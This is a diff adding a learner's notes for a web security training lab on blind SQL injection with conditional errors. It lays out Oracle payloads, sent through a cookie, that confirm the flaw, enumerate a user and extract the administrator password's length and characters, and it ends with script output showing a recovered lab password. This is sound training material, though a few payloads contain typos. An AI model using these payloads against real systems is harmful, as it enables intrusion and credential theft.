@@ -1,0 +1,129 @@
+Lab 12 - Blind SQL injection with conditional errors
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+- Output administrator password by exploiting the SQL injection
+- Login as the administrator user
+
+Analysis:
+
+1. Confirm that the cookies parameter is vulnerable
+
+Try the ollowing payloads: 
+' || (SELECT '') || ' -> error -> must be Oracle DB
+' || (SELECT '' FROM DUAL) || ' -> 200 response -> Oracle database
+' || (SELECT '' FROM dualasdfas) || ' -> error
+
+--> cookies param is vulnerable -> Oracle DB
+
+NOTE: || is string concatenation.
+Example: SELECT 'a' || ',' || 'b' AS letter will combine a letter. The result become 'a,b' 
+https://stackoverflow.com/questions/23372550/what-does-sql-select-symbol-mean
+
+2. Confirm that the users table exists in the database
+
+' || (SELECT '' FROM users WHERE rownum=1) || ' -> 200 response
+
+--> users table exists
+
+3. Confirm that the administrator user exists in the users database
+
+' || (SELECT '' FROM users WHERE username='administrator') || ' -> 200 response
+' || (SELECT '' FROM users WHERE username='administratorasdasdasd') || ' -> 200 response
+... Not helpful...
+Let's try some other queries...
+
+' || (SELECT CASE WHEN (1=1) THEN _ ELSE _ END FROM DUAL) || '
+-> format for the query
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
+-> if WHEN (1=1) is true (it is), then we do SELECT TO_CHAR(1/0) FROM DUAL
+-> error
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
+-> if WHEN (1=0) is false (it is), then we do SELECT '' FROM DUAL
+-> 200 response
+
+How can we use this to determine if the users table exists in the database???
+
+Instead of using FROM DUAL, we will do this instead:
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
+
+Explanation:
+
+To understand this query, we need to understand the order of operation of SQL queries.
+In the query above, the "FROM users WHERE username='administrator'" is evaluated FIRST.
+    This means that it is checking if the username administrator exists or not FIRST.
+    If it DOES exist, perform the "SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END" section of the query.
+    Else, do NOT perform the "SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END" section of the query.
+
+So, if the administrator exists in the DB, the query above will execute
+    -> SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END
+    -> 1=1 is true, so we set CASE to be TO_CHAR(1/0)
+    -> SELECT TO_CHAR(1/0) FROM users WHERE 'administrator'
+    -> error
+    -> which means that the administrator user exists
+
+Test:
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
+-> error -> administrator user exists
+
+And, if the user does NOT exist in the DB, i.e. bob123...
+    -> FROM users WHERE username='bob123' does not exist, so the SELECT ... query is never executed
+    -> Which means it never had to run the TO_CHAR(1/0) function...
+    -> 200 response
+
+Test:
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='bob123') || '
+-> 200 response -> bob123 does NOT exist
+
+4. Determine length of password
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>1) || ' -> error
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>2) || ' -> error
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>3) || ' -> error
+...
+if 500 error response, it means that the length of the password is greater than <NUM>
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>19) || ' -> error
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>20) || ' -> 200 response
+
+You can also do this:
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)=1) || ' -> 200 response -> length is not 1
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)=2) || ' -> 200 response -> length is not 2
+...
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)=19) || ' -> 200 response -> length is not 19
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)=20) || ' -> error -> length is 20
+
+-> therefore, length of password is 20 characters
+
+5. Output the administrator password
+
+Enumerate the password (brute-force every character)
+
+first char is "a"?
+first char is "b"?
+first char is "c"?
+...
+first char is "f"!
+first two chars is "fa"?
+first two chars is "fb"?
+first two chars is "fc"?
+...
+etc.
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1))='a' || '
+
+
+Since we don't have Burp Intruder, let's just move on to the Python part of the lab.
+
+======================================================================================================================================================================
+Python script usage and output:
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-12]
+└─$ python3 sqli-lab-12.py "https://0a3d004504466862804f49ab0054001f.web-security-academy.net"
+[+] Brute-force administrator password with SQLi payloads without triggering 'maximum X retries reached' message.
+[+] Retrieving administrator password...
+axlotla2wn8ihzu9f0w8
+[+] Brute-force exploit completed.
